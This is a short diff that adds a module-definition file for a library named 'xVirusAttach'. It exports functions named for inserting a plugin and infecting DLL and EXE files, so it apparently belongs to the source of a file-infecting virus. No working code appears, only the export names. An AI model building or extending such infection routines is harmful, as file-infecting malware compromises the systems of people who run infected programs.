@@ -1,0 +1,6 @@
+LIBRARY	"xVirusAttach"
+EXPORTS
+
+xVirusInsertPlugin
+xVirusInfect2Dll
+xVirusInfect2Exe
